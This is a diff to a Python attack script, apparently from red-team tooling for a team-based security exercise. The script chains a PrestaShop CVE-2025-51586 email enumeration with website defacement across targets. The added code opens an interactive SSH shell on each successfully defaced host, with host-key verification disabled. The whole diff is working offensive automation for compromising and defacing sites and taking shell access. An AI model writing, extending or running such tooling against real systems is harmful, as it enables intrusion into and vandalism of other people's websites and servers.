@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import argparse
+import shutil
+import subprocess
 import sys
 from pathlib import Path
 
@@ -10,7 +12,7 @@ if str(ROOT_DIR) not in sys.path:
 
 from lib.common import resolve_team_numbers
 from init_access.cve_2025_51586_enum import run_enumeration
-from lib.operations import RemoteExecutor, TARGETS, WebsiteDefacement
+from lib.operations import DEFAULT_USER, RemoteExecutor, TARGETS, WebsiteDefacement
 
 
 def parse_targets(choice: str) -> list:
@@ -34,6 +36,12 @@ def main() -> int:
         "--skip-prestashop-enum",
         action="store_true",
         help="Skip CVE-2025-51586 email enumeration before defacement",
+    )
+    parser.add_argument(
+        "--shell-on-success",
+        choices=["auto", "always", "never"],
+        default="auto",
+        help="Open an SSH shell after defacement (auto opens only for single target/team)",
     )
     parser.add_argument("--enum-start-id", type=int, default=1, help="Starting id_employee to test")
     parser.add_argument("--enum-end-id", type=int, default=100, help="Ending id_employee to test")
@@ -79,6 +87,34 @@ def main() -> int:
         results = defacer.restore_prestashop(targets, prestashop_root=args.root)
 
     print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")
+
+    if args.action == "deface_prestashop" and args.shell_on_success != "never":
+        ssh_success = [entry for entry in results["success"] if entry.get("method") == "ssh"]
+        if ssh_success:
+            if args.shell_on_success == "always" or (
+                args.shell_on_success == "auto"
+                and len(teams) == 1
+                and len(targets) == 1
+                and len(ssh_success) == 1
+            ):
+                if shutil.which("ssh") is None:
+                    print("[!] SSH client not found; cannot open shell automatically.")
+                else:
+                    entry = ssh_success[0]
+                    ip = entry.get("ip")
+                    if ip:
+                        print(f"[+] Launching SSH shell to {DEFAULT_USER}@{ip}...")
+                        subprocess.run(
+                            [
+                                "ssh",
+                                "-o",
+                                "StrictHostKeyChecking=no",
+                                "-o",
+                                "UserKnownHostsFile=/dev/null",
+                                f"{DEFAULT_USER}@{ip}",
+                            ],
+                            check=False,
+                        )
     return 0
 
 
